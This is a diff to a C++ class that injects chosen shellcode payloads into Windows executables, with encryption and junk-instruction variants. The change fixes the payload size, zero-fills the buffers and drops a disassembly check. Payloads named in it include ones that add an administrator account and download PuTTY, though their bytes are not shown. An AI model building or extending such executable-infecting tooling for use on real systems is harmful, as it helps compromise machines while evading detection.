@@ -2040,6 +2040,8 @@ QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_pa
     //setting the full file path
     set_morphed_exe_file_path(exe_file_path);
 
+    this->payload_num_of_bytes = 0x400;
+
     //calculate the file alignment factor to align the section
     calculate_file_alignment_factor(this->payload_num_of_bytes,this->file_alignment,this->file_alignment_factor);
 
@@ -2121,7 +2123,7 @@ QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_pa
 
 
     //stores the payload into a variable char* and the ptr is to do calculation
-    char *payload_section_buffer_original = new char [this->payload_raw_data_size];
+    char *payload_section_buffer_original = new char [this->payload_raw_data_size]{0};
     char *payload_section_buffer_ptr = payload_section_buffer_original;
 
     //we need to store the payload entry point address into edi, so that stosd will work as intended
@@ -2405,6 +2407,8 @@ QString Morph_Executable_Controller::morph_exe_with_encryption(QString exe_file_
     //setting the full file path
     set_morphed_exe_file_path(exe_file_path);
 
+    this->payload_num_of_bytes = 0x400;
+
     //calculate the file alignment factor to align the section
     calculate_file_alignment_factor(this->payload_num_of_bytes,this->file_alignment,this->file_alignment_factor);
 
@@ -2500,7 +2504,7 @@ QString Morph_Executable_Controller::morph_exe_with_encryption(QString exe_file_
 
 
     //stores the payload into a variable char* and the ptr is to do calculation
-    char *payload_section_buffer_original = new char [this->payload_raw_data_size];
+    char *payload_section_buffer_original = new char [this->payload_raw_data_size]{0};
     char *payload_section_buffer_ptr = payload_section_buffer_original;
 
 
@@ -2790,59 +2794,46 @@ QString Morph_Executable_Controller::morph_exe_with_encryption_junk_alt_instruct
             set_morphed_exe_name(exe_file_path,"_CALC_SHELLCODE");
             this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
             populate_payload_vec(this->payload_vec,CALC_SHELLCODE,this->payload_num_of_bytes);
-            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
             break;
 
         case 1:
             set_morphed_exe_name(exe_file_path,"_CMD_SHELLCODE");
             this->payload_num_of_bytes = sizeof(CMD_SHELLCODE) - 1; //the -1 is to get rid of terminating character
             populate_payload_vec(this->payload_vec,CMD_SHELLCODE,this->payload_num_of_bytes);
-            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
             break;
 
         case 2:
             set_morphed_exe_name(exe_file_path,"_MESSAGE_BOX_SHELLCODE");
             this->payload_num_of_bytes = sizeof(MESSAGE_BOX_SHELLCODE) - 1; //the -1 is to get rid of terminating character
             populate_payload_vec(this->payload_vec,MESSAGE_BOX_SHELLCODE,this->payload_num_of_bytes);
-            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
             break;
 
         case 3:
             set_morphed_exe_name(exe_file_path,"_CRASH_PROGRAM_SHELLCODE");
             this->payload_num_of_bytes = sizeof(CRASH_PROGRAM_SHELLCODE) - 1; //the -1 is to get rid of terminating character
             populate_payload_vec(this->payload_vec,CRASH_PROGRAM_SHELLCODE,this->payload_num_of_bytes);
-            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
             break;
 
         case 4:
             set_morphed_exe_name(exe_file_path,"_SYSTEM_INFO_SHELLCODE");
             this->payload_num_of_bytes = sizeof(SYSTEM_INFO_SHELLCODE) - 1; //the -1 is to get rid of terminating character
             populate_payload_vec(this->payload_vec,SYSTEM_INFO_SHELLCODE,this->payload_num_of_bytes);
-            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
             break;
 
         case 5:
             set_morphed_exe_name(exe_file_path,"_DOWNLOAD_PUTTY_SHELLCODE");
             this->payload_num_of_bytes = sizeof(DOWNLOAD_PUTTY_SHELLCODE) - 1; //the -1 is to get rid of terminating character
             populate_payload_vec(this->payload_vec,DOWNLOAD_PUTTY_SHELLCODE,this->payload_num_of_bytes);
-            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
             break;
 
         case 6:
             set_morphed_exe_name(exe_file_path,"_NEW_ADMIN_SHELLCODE");
             this->payload_num_of_bytes = sizeof(NEW_ADMIN_SHELLCODE) - 1; //the -1 is to get rid of terminating character
             populate_payload_vec(this->payload_vec,NEW_ADMIN_SHELLCODE,this->payload_num_of_bytes);
-            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
             break;
 
         default:
             break;
-    }
-
-    error_warning_message_box(morph_status);
-    if(this->morph_status.contains("ERROR") == true)
-    {
-        return this->morph_status;
     }
 
 	//for disassembly
